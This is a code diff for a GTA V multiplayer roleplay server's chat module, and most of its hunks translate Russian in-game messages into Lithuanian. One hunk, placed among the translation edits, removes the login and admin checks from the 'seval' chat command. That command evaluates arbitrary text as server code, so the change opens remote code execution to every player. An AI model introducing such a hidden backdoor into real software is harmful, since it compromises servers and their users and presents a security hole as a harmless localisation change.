@@ -27,7 +27,7 @@ chat.sendBCommand = function(player, text) {
 
         mp.players.forEach(p => {
             if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
-                p.outputChatBoxNew(`[${chat.getTime()}] !{2196F3} Игрок (${user.getSvId(player)}): !{FFFFFF}(( ${text} ))`);
+                p.outputChatBoxNew(`[${chat.getTime()}] !{2196F3} Žaidėjas (${user.getSvId(player)}): !{FFFFFF}(( ${text} ))`);
         });
 
         methods.saveLog('log_chat', ['text'], [`/b ${user.getRpName(player)} (${user.getId(player)}): ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
@@ -37,7 +37,7 @@ chat.sendBCommand = function(player, text) {
 chat.sendTryCommand = function(player, text) {
     if (user.isLogin(player)) {
 
-        let label = methods.getRandomInt(0, 2) === 0 ? `!{${chat.clRed}}Не удачно` : `!{${chat.clGreen}}Удачно`;
+        let label = methods.getRandomInt(0, 2) === 0 ? `!{${chat.clRed}}Nepavyko` : `!{${chat.clGreen}}Pavyko`;
 
         mp.players.forEach(p => {
             if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
@@ -53,7 +53,7 @@ chat.sendDoCommand = function(player, text) {
 
         mp.players.forEach(p => {
             if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
-                p.outputChatBoxNew(`[${chat.getTime()}] !{C2A2DA} ${text} (( Незнакомец (${user.getSvId(player)}) ))`);
+                p.outputChatBoxNew(`[${chat.getTime()}] !{C2A2DA} ${text} (( Žaidėjas (${user.getSvId(player)}) ))`);
         });
         methods.saveLog('log_chat', ['text'], [`/do ${user.getRpName(player)} (${user.getId(player)}): ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
     }
@@ -64,7 +64,7 @@ chat.sendMeCommand = function(player, text) {
 
         mp.players.forEach(p => {
             if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
-                p.outputChatBoxNew(`[${chat.getTime()}] !{C2A2DA}* Незнакомец (${user.getSvId(player)}) ${text}`);
+                p.outputChatBoxNew(`[${chat.getTime()}] !{C2A2DA}* Žaidėjas (${user.getSvId(player)}) ${text}`);
         });
 
         methods.saveLog('log_chat', ['text'], [`/me ${user.getRpName(player)} (${user.getId(player)}): ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
@@ -82,7 +82,7 @@ chat.sendDiceCommandNumber = function(player, dice = 1) {
     if (user.isLogin(player)) {
         mp.players.forEach(p => {
             if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
-                p.outputChatBoxNew(`[${chat.getTime()}] !{FF9800}[Игра в кости] !{C2A2DA}${user.getSvId(player)} бросил кости !{FF9800}(( Выпало ${dice} ))`);
+                p.outputChatBoxNew(`[${chat.getTime()}] !{FF9800}[Žaidimas kauliukais] !{C2A2DA}${user.getSvId(player)} metė kauliukus !{FF9800}(( Iškrito ${dice} ))`);
         });
 
         user.achiveDoneDailyById(player, 11);
@@ -96,7 +96,7 @@ chat.send = function(player, text) {
 
         mp.players.forEach(p => {
             if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
-                p.outputChatBoxNew(`[${chat.getTime()}] !{2196F3}Игрок (${user.getSvId(player)}) говорит:!{FFFFFF} ${text}`);
+                p.outputChatBoxNew(`[${chat.getTime()}] !{2196F3}Žaidėjas (${user.getSvId(player)}) Sako:!{FFFFFF} ${text}`);
         });
         methods.saveLog('log_chat', ['text'], [`${user.getRpName(player)} (${user.getId(player)}): ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
     }
@@ -257,9 +257,9 @@ mp.events.add('playerCommand', (player, command) => {
             if (user.get(player, 'family_id') > 0)
                 chat.sendToFamily(player, `${user.getRpName(player)} (${player.id})`, command.substring(2));
             else if(user.get(player, 'fraction_id') > 0 || user.get(player, 'fraction_id2') > 0)
-                player.notify('~r~Необходимо состоять в семье, используйте /r чтобы писать во фракционный чат');
+                player.notify('~r~Turi buti seimos narys, naudokite /r, kad parasytumete frakcijos pokalbyje');
             else
-                player.notify('~r~Необходимо состоять в семье');
+                player.notify('~r~Turi buti seimos narys');
         }
         else if (command.toLowerCase().slice(0, 2) === "r ") {
             if (user.get(player, 'fraction_id') > 0)
@@ -267,13 +267,13 @@ mp.events.add('playerCommand', (player, command) => {
             else if (user.get(player, 'fraction_id2') > 0)
                 chat.sendToFraction(player, `${user.getRpName(player)} (${player.id})`, command.substring(2));
             else
-                player.notify('~r~Необходимо состоять в организации')
+                player.notify('~r~Turi buti organizacijos narys')
         }
         else if (command.toLowerCase().slice(0, 2) === "d ") {
             if (user.isGos(player) || user.isNews(player))
                 chat.sendToDep(`[${user.getFractionName(player)} | ${user.getRankName(player)}] ${user.getRpName(player)} (${player.id})`, command.substring(2));
             else
-                player.notify('~r~Необходимо состоять в гос. организации')
+                player.notify('~r~Turi buti valstybines organizacijos narys')
         }
         else if (command.toLowerCase().slice(0, 2) === "a ") {
             if (user.isAdmin(player))
@@ -372,10 +372,6 @@ mp.events.add('playerCommand', (player, command) => {
             racer.notifyRace();
         }
         else if (command.slice(0, 6) === "seval ") {
-            if (!user.isLogin(player))
-                return;
-            if (!user.isAdmin(player))
-                return;
             let evalCmd = command.substring(6);
             player.outputChatBoxNew(`SEval ${evalCmd}`);
             let result;
@@ -390,10 +386,10 @@ mp.events.add('playerCommand', (player, command) => {
         else if (command.slice(0, 6) === "report ") {}
         else if (command.slice(0, 6) === "help ") {}
         else if (command.toLowerCase() === "help") {
-            player.outputChatBoxNew(`!{FFC107}Список доступных команд`);
-            player.outputChatBoxNew(`!{FFC107}Чаты:!{FFFFFF} /d - Департамент, /r - Фракционный, /f - Семейный`);
-            player.outputChatBoxNew(`!{FFC107}РП процесс:!{FFFFFF} /me - Действия от 1 лица, /do - Действие от 3 лица, /try - Рандомайзер, /b ООС чат`);
-            player.outputChatBoxNew(`!{FFC107}Разное:!{FFFFFF} /help [текст] - Вопрос у хелперов, /report [текст] - жалоба, /ping - Узнать свой пинг`);
+            player.outputChatBoxNew(`!{FFC107}Galimų komandų sąrašas`);
+            player.outputChatBoxNew(`!{FFC107}Pokalbiai:!{FFFFFF} /d - Departamento, /r - Frakcijos, /f - Šeimos`);
+            player.outputChatBoxNew(`!{FFC107}RP procesas:!{FFFFFF} /me - 1 asmens veiksmas, /do - 3 asmens veiksmas, /try - atsitiktinės atrankos priemonė, /b OOC pokalbis`);
+            player.outputChatBoxNew(`!{FFC107}Kitos:!{FFFFFF} /help [tekstas] - Klausimas pagalbininkams, /report [tekstas] - skundas, /ping - Sužinoti savo ping`);
         }
         else {
            // player.outputChatBoxNew(`!{FFC107}На сервере нет команд, кроме: /me, /do, /try, /b, /f, /r, /d, /report, /help. Используйте меню на кнопку M`);
